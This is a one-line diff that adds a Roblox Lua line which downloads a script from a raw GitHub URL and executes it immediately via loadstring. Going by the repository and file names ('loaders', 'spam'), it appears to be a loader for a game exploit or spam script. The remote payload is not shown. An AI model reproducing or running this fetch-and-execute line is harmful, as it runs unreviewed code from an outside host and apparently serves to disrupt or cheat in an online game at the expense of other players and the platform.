@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LengthRescuer49/loaders/main/loaders/scrooms-spam5-x8gb6ye1if0obv.lua"))()
